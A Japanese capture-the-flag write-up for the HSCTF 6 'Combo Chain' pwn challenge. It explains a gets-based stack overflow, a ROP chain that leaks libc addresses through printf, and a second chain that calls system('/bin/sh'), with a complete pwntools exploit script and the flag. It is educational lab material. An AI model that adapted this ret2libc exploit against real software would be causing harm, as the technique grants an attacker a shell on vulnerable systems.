---
tags: pwn
---

# HSCTF 6 - Combo Chain

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/hsncsclub/HSCTF-6-Problems>

## Writeup

### outline

※追記: libc databaseを使う前提で書いていますが、配られたリポジトリに無かっただけで解いた人間に聞いたらlibcは配られていたらしいです、ちなみに2.23

`vuln`関数内に`gets`による自明なBOFがある。よってROPでどこかのGOTをprintfでﾀﾞﾊﾞｧしてlibc配置アドレスを求め、`system`のオフセットを足したものを2度目のROPで流し込みシェルを起動する
一般的なROPだがlibcが配られていないので2つ以上のシンボルの位置を一旦リークし、libc databaseにぶん投げる必要がある。

### libcバージョンの特定

今回はlibcが配布されていないっぽいのでlibc database searchという素晴らしいサービスを使う。こいつはlibc内の2つのシンボルの差分がlibc毎に一定であることからシンボルのオフセットを2つ以上与えると対応するlibcのバージョンを推定してくれる。
というわけでret2plt(`printf(func1@got)`) -> ret2main -> ret2plt(`printf(func2@got)`)という2回のprintfで2箇所の関数シンボルのアドレスを入手する

libcの特定用に構成したROPチェーンは次の通り
```
rbp - 0x08 : aaaaaaaa
rbp        : aaaaaaaa
rbp + 0x08 : &(ret)  # printf用のalignment調整
rbp + 0x10 : &(pop rdi; ret)
rbp + 0x18 : func1@got (setbufを使用)
rbp + 0x20 : printf@plt
rbp + 0x28 : &(vuln) + 0x1  # ret2main用のalignment調整
```
これでひとまず`vuln`の先頭に戻った上に`func1@got`の中身、つまり`func1`の配置先を知ることが出来る。
あとはこれと同じもの別の関数の配置先を知るように構成すれば良い

libcのバージョンが判明したところでもう一度exploitを構築する。

### libc配置先の特定

いつもの作業
さっきのバージョン特定と同じペイロードで配置先がわかるので、事前にlibc中のオフセットを調べておき、引けば求まる。今回はlibc databaseがオフセットをくれたのでそれを流用する。

### シェル起動

さて、`vuln`の先頭に戻ってきたところで求めたベースアドレスに`system`のオフセットを足して挙げると`system`の配置場所が判明する。今度はこれをROPに仕込むのだが引数である`"/bin/sh\x00"`が必要
ここでバイナリ中を頑張って探すと存在するので(一番最初のメッセージが`Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: `であるが、実はこれはバイナリ中だと2つに分割されており、その境界が綺麗に`/bin/sh`と`? Enter`である)そこのアドレスをROP Gadgetでrdiに仕込んで`system`を呼べば無事にシェルが起動できる


## Code

```python
from pwn import remote, p64, u64, ELF, process


def pad_u64(b):
    while len(b) < 8:
        b += b"\x00"

    return u64(b)

if __name__ == '__main__':
    target = "localhost"
    port = 2345
    s = remote(target, port)
    # s = process("./combo-chain")
    print(s.recvuntil(b"!: "))

    elf = ELF("./combo-chain")

    # plt, got
    setbuf_got = elf.got["setbuf"]
    gets_got = elf.got["gets"]
    printf_plt = elf.plt["printf"]

    # libc (libc-2.23)
    # https://libc.blukat.me/?q=gets%3A7d80%2Csetbuf%3Af6b0&l=libc6_2.23-0ubuntu10_amd64
    libc = {
        "system": 0x45390,
        "gets": 0x6ed80,
        "setbuf": 0x766b0
    }

    # text
    binsh = next(elf.search(b"/bin/sh"))
    print(hex(binsh))

    # gadget
    ret_vuln = 0x401167
    pop_rdi = 0x401263
    ret = 0x40101a

    junk_offset = 16
    payload = b"a" * junk_offset
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(setbuf_got)
    payload += p64(printf_plt)
    payload += p64(ret_vuln)

    s.sendline(payload)
    r = s.recv(6)
    libc_base = pad_u64(r) - libc["setbuf"]

    # print("setbuf:", hex(pad_u64(r)))
    print("libc base:", hex(libc_base))
    s.recvuntil(b"!: ")

    payload = b"a" * junk_offset
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(libc_base + libc["system"])

    s.sendline(payload)

    s.interactive()

    """ determine libc version
        payload += p64(gets_got)
        payload += p64(printf_plt)
        payload += p64(ret_vuln)

        s.sendline(payload)
        r = s.recv(6)

        print("gets:", hex(pad_u64(r)))
    """

```

## Flag

本番環境をDockerで再現出来たので当日は解いていない
`hsctf{i_thought_konami_code_would_work_here}`

## 参考文献(というかツール)

* [libc database search](https://libc.blukat.me/): 2つ以上の関数のオフセットを指定すると使われているlibcを教えてくれるすごいやつ